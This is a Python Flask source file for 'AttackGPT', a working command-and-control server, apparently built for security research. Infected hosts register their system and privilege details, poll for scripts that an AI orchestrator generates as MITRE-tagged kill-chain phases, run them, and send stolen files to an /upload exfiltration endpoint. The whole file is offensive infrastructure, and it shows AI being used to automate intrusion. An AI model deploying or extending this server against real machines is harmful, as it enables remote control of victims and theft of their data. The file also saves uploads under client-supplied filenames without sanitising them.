# Copyright 2026 Netskope, Inc.
import logging
from flask import Flask, request, jsonify
import threading
import time
import queue
import os
import uuid
from datetime import datetime
from orchestrator_agentic import Orchestrator



log_filename = f"attackgpt_{datetime.now().strftime('%m%d%Y')}.txt"
logging.basicConfig(
    level=logging.INFO,
    format='%(message)s',
    handlers=[
        logging.FileHandler(log_filename, mode='a', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('attackgpt')


flask_log = logging.getLogger('werkzeug')
flask_log.setLevel(logging.ERROR)

app = Flask(__name__)


logger.info(f"\n{'='*60}")
logger.info(f"AttackGPT Server Started - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
logger.info(f"Log file: {log_filename}")
logger.info(f"{'='*60}\n")

COMMAND_QUEUE = queue.Queue()
CURRENT_AGENT = None  
CURRENT_SESSION_ID = None
COMMANDS = {}


@app.route('/register', methods=['POST'])
def register():
    """
    Step 1: Stub connects and identifies itself.
    """
    global CURRENT_SESSION_ID, CURRENT_AGENT
    try:
        data = request.json
    except Exception as e:
        return jsonify({"status": "error", "message": "Invalid JSON"}), 400
    if not data:
            return jsonify({"status": "error", "message": "No data"}), 400
    
        
    
    
    session_id = str(uuid.uuid4())[:8]
    CURRENT_SESSION_ID = session_id
    CURRENT_AGENT = data
    
    logger.info(f"\n[+] NEW INFECTION: {session_id}")
    logger.info(f"    OS: {data.get('os')}")
    logger.info(f"    User: {data.get('user')}")
    logger.info(f"    Admin: {data.get('is_admin')}")
    logger.info(f"    os_version: {data.get('os_version')} ")
    logger.info(f"    hostname: {data.get('hostname')} ")
    logger.info(f"    os architecture: {data.get('os_arch')} ")
    logger.info(f"    temp folder: {data.get('temp_folder')} ")

    
    return jsonify({"status": "registered", "session_id": session_id})

@app.route('/poll', methods=['POST'])
def poll():
    """
    Step 2: Stub asks 'Do you have work for me?'
    Return the FIRST pending command if any
    """
    if COMMAND_QUEUE.empty():
        
        return jsonify({"type": "SLEEP"})
    else:
        
        task = COMMAND_QUEUE.get()

        
        cmd_id = task.get('cmd_id')
        if cmd_id and cmd_id in COMMANDS:
            COMMANDS[cmd_id]["sent_at"] = time.time()

        return jsonify(task)
@app.route('/ack', methods=['POST'])
def acknowledge():
    """
    Stub confirms it received the command
    """
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"status": "error"}), 400
    
    cmd_id = data.get('cmd_id')
    
    if cmd_id and cmd_id in COMMANDS:
        COMMANDS[cmd_id]["status"] = "executing"
        logger.info(f"\n[✓] Agent acknowledged command {cmd_id} - now executing")
    
    return jsonify({"status": "ok"})

@app.route('/result', methods=['POST'])
def result():
    """
    Step 3: Stub returns the output of the command.
    """
    data = request.json
    result_data = data.get('result', {})
    cmd_id = data.get('cmd_id')
    error = data.get('error', {})
    if cmd_id and cmd_id in COMMANDS:
        if result_data.get('status') == 'success':
            COMMANDS[cmd_id]["status"] = "completed"
        else:
            COMMANDS[cmd_id]["status"] = "failed"

        COMMANDS[cmd_id]["result"] = result_data
        COMMANDS[cmd_id]["completed_at"] = time.time()

    logger.info("\n\n--- RESULT FROM AGENT ---")
    if result_data:
        logger.info(result_data)
    if error:
        logger.info(f"[!] ERROR:\n{error}")
    logger.info("-------------------------")
    return jsonify({"status": "received"})

@app.route('/upload', methods=['POST'])
def upload():
    """
    Exfiltration endpoint - receives uploaded files from victim.
    """
    try:
        if 'file' not in request.files:
            return jsonify({"status": "error", "message": "No file provided"}), 400

        file = request.files['file']
        if file.filename == '':
            return jsonify({"status": "error", "message": "Empty filename"}), 400

        
        exfil_dir = "exfil_data"
        if not os.path.exists(exfil_dir):
            os.makedirs(exfil_dir)

        filepath = os.path.join(exfil_dir, file.filename)
        file.save(filepath)

        file_size_mb = os.path.getsize(filepath) / (1024 * 1024)

        logger.info(f"\n[+] EXFILTRATION RECEIVED")
        logger.info(f"    Filename: {file.filename}")
        logger.info(f"    Size: {file_size_mb:.2f} MB")
        logger.info(f"    Saved to: {filepath}\n")

        return jsonify({
            "status": "success",
            "message": "File uploaded successfully",
            "filename": file.filename,
            "size_mb": round(file_size_mb, 2)
        }), 200

    except Exception as e:
        logger.info(f"[!] Upload error: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

def main_loop():
    """
    Main function that starts Orchestrator and executes kill chain
    """
    
    time.sleep(1)

    logger.info("\n" + "="*40)
    logger.info(" C2 ORCHESTRATOR STARTED")
    logger.info(" Waiting for Stub to connect...")
    logger.info("="*40 + "\n")

    campaign_triggered = False

    while True:
        
        if CURRENT_AGENT is None:
            time.sleep(2)
            continue

        
        if not campaign_triggered:
            logger.info("\n[+] Agent connected! Triggering attack campaign...\n")
            campaign_triggered = True
        else:
            
            time.sleep(5)
            continue

        
        lang = "ps" if CURRENT_AGENT.get('os') == "Windows" else "py"

        logger.info("[SERVER DEBUG] About to initialize orchestrator...")
        
        brain = Orchestrator(CURRENT_AGENT, "PowerShell" if CURRENT_AGENT.get('os') == "Windows" else "Python")
        logger.info("[SERVER DEBUG] Orchestrator created")

        
        logger.info("[SERVER DEBUG] Calling run_campaign()...")
        campaign_generator = brain.run_campaign()
        logger.info(f"[SERVER DEBUG] run_campaign() returned: {type(campaign_generator)}")

        if campaign_generator is None:
            logger.info("[!] Failed to initialize campaign")
            logger.info("[!] Terminating session - agent will remain polling but no commands will be sent.")
            time.sleep(999999)
            continue

        
        logger.info(f"[SERVER DEBUG] About to enter for loop")
        logger.info(f"\n[*] Starting incremental kill chain execution")
        logger.info(f"[*] Mode: Generate phase → Execute → Confirm → Generate next phase\n")

        payload_idx = 0
        try:
            for payload in campaign_generator:
                payload_idx += 1
                phase_display = payload.get('phase_number', payload_idx)  
                logger.info(f"\n{'='*60}")
                logger.info(f"[*] PHASE {phase_display}: {payload['phase']}")
                logger.info(f"[*] Technique: {payload['mitre']}")
                logger.info(f"{'='*60}")

                code = payload.get('script')
                if not code:
                    logger.info(f"[!] ERROR: No script in payload. Aborting kill chain.")
                    break

                cmd_id = str(uuid.uuid4())[:8]

                # Queue the task
                task = {
                    "type": "EXEC",
                    "script": code,
                    "lang": lang,
                    "cmd_id": cmd_id
                }
                COMMANDS[cmd_id] = {
                    "task": task,
                    "status": "pending",
                    "result": None,
                    "queued_at": time.time(),
                    "sent_at": None,
                    "completed_at": None
                }

                COMMAND_QUEUE.put(task)
                logger.info(f"  Command ID: {cmd_id}")
                logger.info(f"  Script Length: {len(code)} characters")
                logger.info(f"  Status: Queued - Waiting for victim to poll...")

                
                logger.info("\n" + "="*60)
                logger.info("SCRIPT SENT TO VICTIM")
                logger.info("="*60)
                logger.info(code)
                logger.info("="*60 + "\n")

                
                timeout = 120 
                start_time = time.time()

                while time.time() - start_time < timeout:
                    if COMMANDS[cmd_id]["status"] in ["completed", "failed"]:
                        result = COMMANDS[cmd_id].get("result")

                        if COMMANDS[cmd_id]["status"] == "completed":
                            logger.info(f"\n[✓] Phase {phase_display} completed successfully")
                            output = result.get('output', 'No output')
                            logger.info(f"Output preview: {output[:200]}...")

                            
                            logger.info("\n" + "="*60)
                            logger.info("FULL OUTPUT FROM VICTIM")
                            logger.info("="*60)
                            logger.info(output)
                            logger.info("="*60 + "\n")

                            
                            if output and output != 'No output':
                                try:
                                    import json
                                    result_data = json.loads(output)
                                    
                                    result_key = payload['phase'].replace(' ', '_').replace('-', '_').lower()
                                    brain.results_store[result_key] = result_data
                                    logger.info(f"[*] Stored result: {result_key}")
                                except json.JSONDecodeError:
                                    
                                    result_key = payload['phase'].replace(' ', '_').replace('-', '_').lower()
                                    brain.results_store[f"{result_key}_output"] = output
                                    logger.info(f"[*] Stored raw output: {result_key}_output")
                                except Exception as e:
                                    logger.info(f"[!] WARNING: Error storing results: {e}")
                        else:
                            is_required = payload.get('required', True)
                            logger.info(f"\n[✗] Phase {phase_display} FAILED")
                            logger.info(f"Error: {result.get('output', 'Unknown error')}")
                            if is_required:
                                logger.info(f"[!] Technique is REQUIRED - Aborting kill chain")
                                
                                break
                            else:
                                logger.info(f"[!] Technique is OPTIONAL - Continuing kill chain")
                                
                                break  

                        
                        break
                    time.sleep(1)
                else:
                    
                    is_required = payload.get('required', True)
                    logger.info(f"\n[!] Phase {phase_display} TIMEOUT after {timeout} seconds")
                    if is_required:
                        logger.info(f"[!] Technique is REQUIRED - Aborting kill chain")
                        break
                    else:
                        logger.info(f"[!] Technique is OPTIONAL - Continuing kill chain")
                        

                
                if COMMANDS[cmd_id]["status"] == "failed" and payload.get('required', True):
                    break  

                
                logger.info(f"[*] Phase {phase_display} complete. Requesting next phase from orchestrator...")
                time.sleep(2)

        except Exception as e:
            logger.info(f"\n[!] EXCEPTION in kill chain execution:")
            logger.info(f"[!] Error: {str(e)}")
            import traceback
            traceback.print_exc()

        logger.info(f"\n{'='*60}")
        logger.info("[*] KILL CHAIN EXECUTION COMPLETE")
        logger.info(f"{'='*60}\n")

        
        time.sleep(999999)

if __name__ == '__main__':
    
    t = threading.Thread(target=main_loop)
    t.daemon = True
    t.start()


    app.run(host='0.0.0.0', port=8888, debug=False)
